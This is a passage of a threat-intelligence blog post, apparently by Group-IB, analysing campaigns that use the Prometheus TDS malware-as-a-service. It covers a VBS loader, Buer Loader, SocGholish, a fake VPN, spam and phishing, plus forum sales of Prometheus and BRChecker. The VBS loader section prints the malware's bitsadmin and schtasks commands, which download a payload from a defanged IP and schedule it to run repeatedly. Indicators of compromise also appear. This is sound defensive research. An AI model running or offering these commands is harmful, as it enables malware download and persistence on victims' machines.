<div id="attachment_25628" style="width: 616px" class="wp-caption alignnone"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/23-min-2.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25628" decoding="async" class="size-full wp-image-25628 webpexpress-processed" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20606%20755'%3E%3C/svg%3E" alt="Graph representing the IcedID C2 environment" width="606" height="755" data-lazy-src="https://www.group-ib.com/wp-content/uploads/23-min-2.png"><noscript><img aria-describedby="caption-attachment-25628" decoding="async" class="size-full wp-image-25628 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/23-min-2.png" alt="Graph representing the IcedID C2 environment" width="606" height="755"></noscript></picture><p id="caption-attachment-25628" class="wp-caption-text">Graph representing the IcedID C2 environment</p></div>
<h3>VBS Loader</h3>
<p>During the analysis, the specialists found three samples of <strong>an unidentified VBS loader</strong>. After downloading these files, the user is redirected to the USPS website. When the user clicks on a malicious link, Prometheus TDS asks the user to download a ZIP archive containing a VBS script. After the script is launched, the payload is downloaded in the form of another VBS script using bitsadmin. The downloaded file is launched using the Windows Task Scheduler by creating a command that runs the VBS script every 30 minutes starting at 00:00.</p>
<div id="attachment_25629" style="width: 906px" class="wp-caption alignnone"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/24-min-3.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25629" decoding="async" class="size-full wp-image-25629 webpexpress-processed" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20896%20438'%3E%3C/svg%3E" alt="Part of the obfuscated VBS loader " width="896" height="438" data-lazy-src="https://www.group-ib.com/wp-content/uploads/24-min-3.png"><noscript><img aria-describedby="caption-attachment-25629" decoding="async" class="size-full wp-image-25629 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/24-min-3.png" alt="Part of the obfuscated VBS loader " width="896" height="438"></noscript></picture><p id="caption-attachment-25629" class="wp-caption-text">Part of the obfuscated VBS loader containing the URL for the payload download</p></div>
<p>To download and run the payload, the VBS script executes a set of special commands using bitsadmin and schtasks:</p>
<ul>
<li>cmd /k exit | exit &amp; bitsadmin /create EncodingFirm &amp; exit</li>
<li>cmd /k exit | exit &amp; bitsadmin /addfile EncodingFirm hXXp://155[.]94[.]193[.]10/user/get/ButPrinciple1619186669 C:\Users\&lt;User&gt;\AppData\Local\Temp\DefineKeeps.tmp &amp; exit</li>
<li>cmd /k exit | exit &amp; bitsadmin /resume EncodingFirm &amp; exit</li>
<li>cmd /k exit | exit &amp; schtasks /create /sc minute /mo 30 /tn &#8220;Task Update ButPrinciple&#8221; /f /st 00:00 /tr C:\Users\&lt;User&gt;\AppData\Local\ButPrinciple\ButPrinciple.vbs &amp; exit</li>
<li>cmd /k exit | exit &amp; bitsadmin /complete EncodingFirm &amp; exit</li>
<li>cmd /k exit | exit &amp; bitsadmin /reset &amp; exit</li>
</ul>
<p>At the time of analysis, there was only one similar VBS loader sample on <a href="https://www.virustotal.com/gui/file/a2bd96db3eb0f4e5ab3dd013b0a0ba69c7c84986925623dc31e3b911d963e1b9/details" target="_blank" rel="nofollow noopener">VirusTotal</a>, which was detectable by only one antivirus solution.</p>
<div id="attachment_25630" style="width: 1281px" class="wp-caption alignnone"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/25-min-1.jpg.webp" type="image/webp"><img aria-describedby="caption-attachment-25630" decoding="async" class="size-full wp-image-25630 webpexpress-processed" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201271%20629'%3E%3C/svg%3E" alt="Antivirus detection for file" width="1271" height="629" data-lazy-src="https://www.group-ib.com/wp-content/uploads/25-min-1.jpg"><noscript><img aria-describedby="caption-attachment-25630" decoding="async" class="size-full wp-image-25630 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/25-min-1.jpg" alt="Antivirus detection for file" width="1271" height="629"></noscript></picture><p id="caption-attachment-25630" class="wp-caption-text">Antivirus detection for file fcd8674f8df4390d90dad6c31a3dd6f33d6a74de</p></div>
<h3>Buer Loader</h3>
<p>Within the campaign, the file &#8220;<em>document010498(1).zip</em>&#8221; was also distributed. It contained the file &#8220;<em>document010498.jnlp</em>&#8220;, which downloads the payload from the domain &#8220;<em>secure-doc-viewer[.]com</em>&#8220;.</p>
<p>Unfortunately, at the time of analysis, the domain was not active. Based on the contents of the file, it seems reasonable to assume that it is a decoy document used to download files relating to the second stage.</p>
<div id="attachment_25631" style="width: 738px" class="wp-caption alignnone"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/26-min-3.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25631" decoding="async" class="size-full wp-image-25631 webpexpress-processed" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20728%20327'%3E%3C/svg%3E" alt="Contents of the file document010498.jnlp" width="728" height="327" data-lazy-src="https://www.group-ib.com/wp-content/uploads/26-min-3.png"><noscript><img aria-describedby="caption-attachment-25631" decoding="async" class="size-full wp-image-25631 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/26-min-3.png" alt="Contents of the file document010498.jnlp" width="728" height="327"></noscript></picture><p id="caption-attachment-25631" class="wp-caption-text">Contents of the file document010498.jnlp</p></div>
<p>An analysis of the domain &#8220;secure-doc-viewer[.]com&#8221; by the experts using Group-IB&#8217;s graph revealed that the owner&#8217;s name, as indicated in the WHOIS records of the domain, is &#8220;<em>artem v gushin</em>.&#8221; The analysis also showed that this name is connected to more than 50 domains.</p>
<div id="attachment_25632" style="width: 1357px" class="wp-caption alignnone"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/27-min-1.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25632" decoding="async" class="size-full wp-image-25632 webpexpress-processed" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201347%201018'%3E%3C/svg%3E" alt="Part of the connections of the domain secure-doc-viewer[.]com" width="1347" height="1018" data-lazy-src="https://www.group-ib.com/wp-content/uploads/27-min-1.png"><noscript><img aria-describedby="caption-attachment-25632" decoding="async" class="size-full wp-image-25632 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/27-min-1.png" alt="Part of the connections of the domain secure-doc-viewer[.]com" width="1347" height="1018"></noscript></picture><p id="caption-attachment-25632" class="wp-caption-text">Part of the connections of the domain secure-doc-viewer[.]com according to WHOIS records</p></div>
<p>Among the related domains, researchers identified several of them using the same keywords:</p>
<ul>
<li>pdfsecure[.]net</li>
<li>securepdfviewer[.]com</li>
<li>invoicesecure[.]net</li>
</ul>
<p>The domains are also related to .jnlp files, for example, &#8220;invoice.jnlp&#8221; (SHA1: <a href="https://app.any.run/tasks/1e73e6b5-1f70-4a00-a131-a5d34561c4df/" target="_blank" rel="nofollow noopener">e3249b46e76b3d94b46d45a38e175ef80b7d0526</a>).</p>
<div id="attachment_25633" style="width: 711px" class="wp-caption alignnone"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/28-min-2.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25633" decoding="async" class="size-full wp-image-25633 webpexpress-processed" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20701%20305'%3E%3C/svg%3E" alt="Content of the invoice.jnlp" width="701" height="305" data-lazy-src="https://www.group-ib.com/wp-content/uploads/28-min-2.png"><noscript><img aria-describedby="caption-attachment-25633" decoding="async" class="size-full wp-image-25633 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/28-min-2.png" alt="Content of the invoice.jnlp" width="701" height="305"></noscript></picture><p id="caption-attachment-25633" class="wp-caption-text">Content of the invoice.jnlp</p></div>
<p>Several <a href="https://labs.vipre.com/buer-loader-found-in-an-unusual-email-attachment/" target="_blank" rel="nofollow noopener">studies</a> indicate that the above domains are part of the Buer Loader distribution campaign.</p>
<h3>SocGholish</h3>
<p>The analysis of the URLs of the compromised sites used in the Prometheus TDS infrastructure revealed that some of them redirect the user to the home page of the compromised website.</p>
<div id="attachment_25634" style="width: 1288px" class="wp-caption alignnone"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/29-min-2.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25634" decoding="async" class="size-full wp-image-25634 webpexpress-processed" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201278%20693'%3E%3C/svg%3E" alt="Prometheus.Backdoor URL " width="1278" height="693" data-lazy-src="https://www.group-ib.com/wp-content/uploads/29-min-2.png"><noscript><img aria-describedby="caption-attachment-25634" decoding="async" class="size-full wp-image-25634 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/29-min-2.png" alt="Prometheus.Backdoor URL " width="1278" height="693"></noscript></picture><p id="caption-attachment-25634" class="wp-caption-text">Prometheus.Backdoor URL that redirects the visitor to the home page of the compromised site</p></div>
<p>Through research, it was discovered that these sites are used to distribute <strong>the SocGholish malware</strong> under the guise of Google Chrome browser updates.</p>
<div id="attachment_25635" style="width: 1089px" class="wp-caption alignnone"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/30-min-2.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25635" decoding="async" class="size-full wp-image-25635 webpexpress-processed" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201079%20357'%3E%3C/svg%3E" alt="Loading a landing page with fake Google Chrome browser updates" width="1079" height="357" data-lazy-src="https://www.group-ib.com/wp-content/uploads/30-min-2.png"><noscript><img aria-describedby="caption-attachment-25635" decoding="async" class="size-full wp-image-25635 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/30-min-2.png" alt="Loading a landing page with fake Google Chrome browser updates" width="1079" height="357"></noscript></picture><p id="caption-attachment-25635" class="wp-caption-text">Loading a landing page with fake Google Chrome browser updates</p></div>
<p>At the same time, SocGholish uses a malicious file distribution pattern very similar to the script used by Prometheus TDS. When the user visits an infected site, they see a page with JavaScript code that contains a Base64 encoded ZIP archive with a malicious file that will be downloaded if the user clicks on the &#8220;<em>Update browser</em>&#8221; button.</p>
<div id="attachment_25636" style="width: 625px" class="wp-caption alignnone"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/31-min-2.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25636" decoding="async" class="size-full wp-image-25636 webpexpress-processed" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20615%20421'%3E%3C/svg%3E" alt="Part of the SocGholish landing page" width="615" height="421" data-lazy-src="https://www.group-ib.com/wp-content/uploads/31-min-2.png"><noscript><img aria-describedby="caption-attachment-25636" decoding="async" class="size-full wp-image-25636 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/31-min-2.png" alt="Part of the SocGholish landing page" width="615" height="421"></noscript></picture><p id="caption-attachment-25636" class="wp-caption-text">Part of the SocGholish landing page</p></div>
<p>To the user, this page appears to be offering browser updates.</p>
<div id="attachment_25637" style="width: 1022px" class="wp-caption alignnone"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/32-min-2.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25637" decoding="async" class="size-full wp-image-25637 webpexpress-processed" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201012%20664'%3E%3C/svg%3E" alt="Screenshot of the fake page offering a Chrome browser update" width="1012" height="664" data-lazy-src="https://www.group-ib.com/wp-content/uploads/32-min-2.png"><noscript><img aria-describedby="caption-attachment-25637" decoding="async" class="size-full wp-image-25637 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/32-min-2.png" alt="Screenshot of the fake page offering a Chrome browser update" width="1012" height="664"></noscript></picture><p id="caption-attachment-25637" class="wp-caption-text">Screenshot of the fake page offering a Chrome browser update</p></div>
<h3>Fake VPN</h3>
<p>In addition to distributing malicious files, Prometheus TDS is also used as a classic TDS to redirect users to specific sites. One of these sites is the fake site of a well-known VPN provider located at <em>hXXps://huvpn[.]com/free-vpn/</em>. Clicking the download button initiates the download of a malicious EXE file from <em>hXXps://windscribe.s3.us-east-2.amazonaws[.]com/Windscribe.exe</em> (<em>SHA1: f729b75d68824f200bebe3c3613c478f9d276501</em>).</p>
<div id="attachment_25638" style="width: 810px" class="wp-caption alignnone"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/33-min-2.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25638" decoding="async" class="size-full wp-image-25638 webpexpress-processed" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20800%20600'%3E%3C/svg%3E" alt="A screenshot of a fake Windscribe download page" width="800" height="600" data-lazy-src="https://www.group-ib.com/wp-content/uploads/33-min-2.png"><noscript><img aria-describedby="caption-attachment-25638" decoding="async" class="size-full wp-image-25638 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/33-min-2.png" alt="A screenshot of a fake Windscribe download page" width="800" height="600"></noscript></picture><p id="caption-attachment-25638" class="wp-caption-text">A screenshot of a fake Windscribe download page</p></div>
<h3>Viagra SPAM</h3>
<p><strong>Prometheus TDS also redirected users to sites selling pharmaceutical products.</strong> Operators of such sites often have affiliate and partnership programs. Partners, in turn, often resort to aggressive <strong>SPAM campaigns</strong> in order to increase the earnings within the affiliate program. Analysis of the Prometheus infrastructure by Group-IB specialists revealed links that redirect users to sites relating to a Canadian pharmacy.</p>
<div id="attachment_25639" style="width: 952px" class="wp-caption alignnone"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/34-min.jpg.webp" type="image/webp"><img aria-describedby="caption-attachment-25639" decoding="async" class="size-full wp-image-25639 webpexpress-processed" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20942%20852'%3E%3C/svg%3E" alt="The use of Prometheus TDS for spam emails" width="942" height="852" data-lazy-src="https://www.group-ib.com/wp-content/uploads/34-min.jpg"><noscript><img aria-describedby="caption-attachment-25639" decoding="async" class="size-full wp-image-25639 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/34-min.jpg" alt="The use of Prometheus TDS for spam emails" width="942" height="852"></noscript></picture><p id="caption-attachment-25639" class="wp-caption-text">The use of Prometheus TDS for spam emails to redirect users to particular websites</p></div>
<h3>Banking phishing</h3>
<p><strong>Prometheus TDS was also used to redirect users to banking phishing sites.</strong> For example, during a campaign active from March to May 2021, users who followed the link to Prometheus.Backdoor were redirected to fake sites that mimicked the site of a German bank.</p>
<div id="attachment_25640" style="width: 1290px" class="wp-caption alignnone"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/35-min.jpg.webp" type="image/webp"><img aria-describedby="caption-attachment-25640" decoding="async" class="size-full wp-image-25640 webpexpress-processed" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201280%20960'%3E%3C/svg%3E" alt="Example of a phishing page" width="1280" height="960" data-lazy-src="https://www.group-ib.com/wp-content/uploads/35-min.jpg"><noscript><img aria-describedby="caption-attachment-25640" decoding="async" class="size-full wp-image-25640 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/35-min.jpg" alt="Example of a phishing page" width="1280" height="960"></noscript></picture><p id="caption-attachment-25640" class="wp-caption-text">Example of a phishing page used in the campaign involving Prometheus TDS https://urlscan.io/result/69c84104-f272-4c88-970f-a3131c0580ad/</p></div>
<h2>Offers to buy Prometheus TDS on underground forums</h2>
<p>The analysis presented above describes several unrelated campaigns carried out by different hacker groups using Prometheus TDS. Working based on the assumption that Prometheus TDS is a MaaS solution, Group-IB researchers analyzed various underground forums in search of relevant offers and found a topic started by a user with the username <strong>Main</strong>.</p>
<h3>Prometheus TDS</h3>
</div>
                            
                            <div class="blog-post-content__section"><div class="gallery swiper gallery-swiper-62"><div class="swiper-wrapper"><div class="swiper-slide gallery__item wp-caption"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/36-min-2.png.webp" type="image/webp"><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="Screenshot of the offer to buy the Prometheus TDS" title="36-min" class="webpexpress-processed" data-lazy-src="https://www.group-ib.com/wp-content/uploads/36-min-2.png"><noscript><img src="https://www.group-ib.com/wp-content/uploads/36-min-2.png" alt="Screenshot of the offer to buy the Prometheus TDS" title="36-min" class="webpexpress-processed"></noscript></picture><p class="small wp-caption-text">Screenshot of the offer to buy the Prometheus TDS</p></div><div class="swiper-slide gallery__item wp-caption"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/37-min-2.png.webp" type="image/webp"><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="Screenshot of the offer to buy the Prometheus TDS" title="37-min" class="webpexpress-processed" data-lazy-src="https://www.group-ib.com/wp-content/uploads/37-min-2.png"><noscript><img src="https://www.group-ib.com/wp-content/uploads/37-min-2.png" alt="Screenshot of the offer to buy the Prometheus TDS" title="37-min" class="webpexpress-processed"></noscript></picture><p class="small wp-caption-text">Screenshot of the offer to buy the Prometheus TDS</p></div></div><div class="swiper-pagination"></div><div class="swiper-button-next"></div><div class="swiper-button-prev"></div></div></div>

                  <div class="blog-post-content__section--text"><p>Group-IB <a href="/products/threat-intelligence/" target="_blank" rel="noopener">Threat Intelligence</a> system discovered that the post offering Prometheus for sale was created in August 2020. The owner of the service claimed that Prometheus TDS is an ANTIBOT redirect system designed to send out emails, work with traffic, and for social engineering. In addition, Prometheus TDS can validate web shells, create and configure redirects, operate via proxy, and work with Google accounts, etc. Moreover, the system is able to validate users based on a blacklist, which makes it possible for malicious links to avoid being added to antivirus and spam databases.</p>
<p><strong>Prometheus has two standard modes</strong>:</p>
<ol>
<li>Redirecting users to a target page;</li>
<li>Issuing files for download (DOC, PDF, JS, VBS, EXE).</li>
</ol>
<p>The cost of the system is $250 per month. Screenshots from Prometheus TDS admin level provided by Main can be found below:</p>
</div>

                  <div class="blog-post-content__section--text"><h3>BRChecker</h3>
<p>When examining and monitoring the infrastructure used to host the Prometheus TDS administrative panels, Group-IB experts discovered that some of the servers on which the Prometheus TDS admin panel was previously located now host another unknown panel.</p>
<p>The following is a list of addresses at which different panels were located at different times:</p>
<ul>
<li>188.130.138[.]63;</li>
<li>188.130.138[.]22;</li>
<li>188.130.138[.]236;</li>
<li>188.130.138[.]61;</li>
<li>185.186.142[.]32.</li>
</ul>
<p>Based on the contents of this admin panel&#8217;s JS scripts, Group-IB experts assumed that it is a panel from another solution called <strong>BRChecker</strong>.</p>
<div id="attachment_25658" style="width: 1290px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-25658" decoding="async" class="size-full wp-image-25658" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201280%20719'%3E%3C/svg%3E" alt="Listing of scripts from BRCheker admin panel" width="1280" height="719" data-lazy-src="https://www.group-ib.com/wp-content/uploads/53-min.webp" /><noscript><img aria-describedby="caption-attachment-25658" decoding="async" class="size-full wp-image-25658" src="https://www.group-ib.com/wp-content/uploads/53-min.webp" alt="Listing of scripts from BRCheker admin panel" width="1280" height="719" /></noscript><p id="caption-attachment-25658" class="wp-caption-text">Listing of scripts from BRCheker admin panel</p></div>
<p>An offer to sell the BRChecker system presented as an email address bruter\checker was for the first time posted by the user with the username <strong>Mainin</strong> mid-June 2018. According to the developer&#8217;s description, the system works via modules (workers), installed on rented VPS servers, and controlled through a single admin panel for subsequent brute-forcing or verification of login/password bindings.</p>
<div id="attachment_25659" style="width: 735px" class="wp-caption alignnone"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/54-min-1.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25659" decoding="async" class="size-full wp-image-25659 webpexpress-processed" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20725%20639'%3E%3C/svg%3E" alt="Screenshot of a sale announcement for BRCheker" width="725" height="639" data-lazy-src="https://www.group-ib.com/wp-content/uploads/54-min-1.png"><noscript><img aria-describedby="caption-attachment-25659" decoding="async" class="size-full wp-image-25659 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/54-min-1.png" alt="Screenshot of a sale announcement for BRCheker" width="725" height="639"></noscript></picture><p id="caption-attachment-25659" class="wp-caption-text">Screenshot of a sale announcement for BRCheker</p></div>
<p>As of May 2021, the cost of the system was $490. Screenshots of BRChecker admin panel provided by Main can be found below:</p>
</div>

                  <div class="blog-post-content__section--text"><div id="attachment_25604" style="width: 1610px" class="wp-caption alignnone"><picture><source data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/69-min.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25604" decoding="async" class="size-full wp-image-25604 webpexpress-processed" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201600%201200'%3E%3C/svg%3E" alt="Screenshot of the BRChecker admin panel" width="1600" height="1200" data-lazy-src="https://www.group-ib.com/wp-content/uploads/69-min.png"><noscript><img aria-describedby="caption-attachment-25604" decoding="async" class="size-full wp-image-25604 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/69-min.png" alt="Screenshot of the BRChecker admin panel" width="1600" height="1200"></noscript></picture><p id="caption-attachment-25604" class="wp-caption-text">Screenshot of the BRChecker admin panel</p></div>
<p><strong>The contents of the screenshots in the for-sale notice made it possible to verify that the unknown panel detected before is indeed related to BRChecker.</strong></p>

<script type="text/rocketlazyloadscript">
    const postcontent = document.getElementById('blog-post-content');
    const h2counter = postcontent.getElementsByTagName('h2');

    for (i = 0; i < h2counter.length; i++) {
        const h2elementtag = postcontent.getElementsByTagName('h2')[i];
        const h2element = postcontent.getElementsByTagName('h2')[i].innerHTML;
        let postnavitem = document.createElement('a');
        postnavitem.classList.add('post-navigation__item', 'subtitle2', 'scrollto');
        postnavitem.innerHTML = h2element;
        const postnavlink = postnavitem.innerHTML;
        let str = postnavlink;
        str = str.replace(/<[^>]*>/g, '');
        str = str.replace(/[^a-zA-Z0-9\s\u0400-\u04FF]/g, '');
        str = str.replace(/\s+/g, '-').toLowerCase();
        str = str.replace(/^-+|-+$/g, '');
        postnavitem.classList += ' ' + str;
        postnavitem.href = '#' + str;
        h2elementtag.id = str;
        document.getElementById('post-navigation__wrapper').appendChild(postnavitem);
    }

    const sections = document.querySelectorAll('h2');
    const navItems = document.querySelectorAll('.post-navigation__item');

    window.addEventListener('scroll', () => {
        let current = '';
        sections.forEach((section) => {
            const sectionTop = section.offsetTop;
            const sectionHeight = section.clientHeight;
            if (pageYOffset >= sectionTop - sectionHeight / 10) {
                current = section.getAttribute('id');
            }
        });

        navItems.forEach((a) => {
            a.classList.remove('active');
            if (a.classList.contains(current)) {
                a.classList.add('active');
            }
        });
    });

    // SMOOTH SCROLL
    var $root = jQuery('html, body');


    jQuery('a[href^="#"].scrollto').click(function() {
        var href = jQuery.attr(this, 'href');
        var headerHeight = 100;

        $root.animate({
                scrollTop: jQuery(href).offset().top - headerHeight
            },
            300,
        );

        return false;
    });

    // SMOOTH SCROLL WITH NO HASH
    var $root = jQuery('html, body');


    jQuery('a[href^="#"].scrolltonohash').click(function() {
        var href = jQuery.attr(this, 'href');
        var headerHeight = 100;

        $root.animate({
                scrollTop: jQuery(href).offset().top - headerHeight
            },
            300
        );

        return false;
    });
</script>

<script type="text/rocketlazyloadscript">
    function readingTime() {
        const text = document.getElementById("blog-post-content").innerText;
        const wpm = 225;
        const words = text.trim().split(/\s+/).length;
        const time = Math.ceil(words / wpm);
        document.getElementById("reading-time").innerText = time;
    }
    readingTime();
</script>

<script type="text/rocketlazyloadscript">
    document.getElementById("share-url").value = window.location.href;
    document.getElementById("share-url-mobile").value = window.location.href;
    jQuery('.share-url__copy').click(function() {
        jQuery('.share-url__copy').addClass('success');
        navigator.clipboard.writeText(window.location.href);
        setTimeout(() => {
            jQuery('.share-url__copy').removeClass('success');
        }, 1500);
    });
</script>

<script type="text/rocketlazyloadscript">
    var carousel123 = new Swiper('.carousel123', {
        grabCursor: true,
        pagination: {
            el: '.swiper-pagination',
            clickable: true,
        },
    });

    var authorsMoreThan2Swiper = new Swiper('.authors-more-than-2-swiper', {
        grabCursor: true,
        pagination: {
            el: '.swiper-pagination',
            clickable: true,
        },
        breakpoints: {
            0: {
                slidesPerView: 'auto',
                spaceBetween: 16,
                slidesPerView: 1,
                slidesPerGroup: 1,
            },
            620: {
                spaceBetween: 24,
                slidesPerView: 2,
                slidesPerGroup: 2,
            },
        },
    });

    function positioningSidebar() {
        let sidebar = document.getElementById('sidebar');
        let sidebarHeight = sidebar.offsetHeight;
        let windowHeight = document.documentElement.clientHeight;
        if (windowHeight < (sidebarHeight + 48)) {
            let sidebarAuthors = sidebar.querySelector('.sidebar__authors');
            let sidebarMorePosts = sidebar.querySelector('.sidebar__more-posts');
            let authorsHeight = sidebarAuthors ? sidebarAuthors.offsetHeight : 0;
            let morePostsHeight = sidebarMorePosts ? sidebarMorePosts.offsetHeight : 0;
            let sidebarTop = authorsHeight + morePostsHeight + 140;
            jQuery(sidebar).css('top', -sidebarTop + 'px');
        } else {
            jQuery(sidebar).css('top', '72px');
        }
    }
    window.addEventListener('resize', positioningSidebar);
    positioningSidebar();

    if (localStorage.getItem('theme')) {
        if (localStorage.getItem('theme') == 'dark') {
            jQuery('body').addClass('theme--dark');
        } else if (localStorage.getItem('theme') == 'light') {
            jQuery('body').addClass('theme--white');
        }
    } else {
        localStorage.setItem('theme', 'dark');
        jQuery('body').addClass('theme--dark');
    }

    jQuery('.theme-toggle').click(function() {
        if (localStorage.getItem('theme') == 'dark') {
            localStorage.setItem('theme', 'light');
        } else {
            localStorage.setItem('theme', 'dark');
        }
        jQuery('body').toggleClass('no-transition');
        jQuery('body').toggleClass('theme--dark');
        jQuery('body').toggleClass('theme--white');
        setTimeout(() => {
            jQuery('body').toggleClass('no-transition');
        }, 250);
    });
    jQuery('.share-toggle').click(function() {
        jQuery('.share-toggle').toggleClass('active');
        jQuery('.share-widget').toggleClass('show');
    });
</script>
